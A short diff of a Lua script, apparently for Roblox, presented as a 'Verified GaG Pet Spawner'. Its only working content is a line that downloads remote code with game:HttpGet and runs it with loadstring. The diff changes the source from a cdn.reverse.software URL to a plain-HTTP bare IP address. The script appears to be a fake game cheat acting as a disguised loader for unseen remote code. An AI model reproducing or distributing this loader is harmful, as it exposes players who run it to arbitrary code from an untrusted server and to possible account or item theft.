@@ -1,4 +1,4 @@
 -- Verified GaG Pet Spawner
 
 ID="c3706003-dbe7-4bcb-b949-1a59c79180ef";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
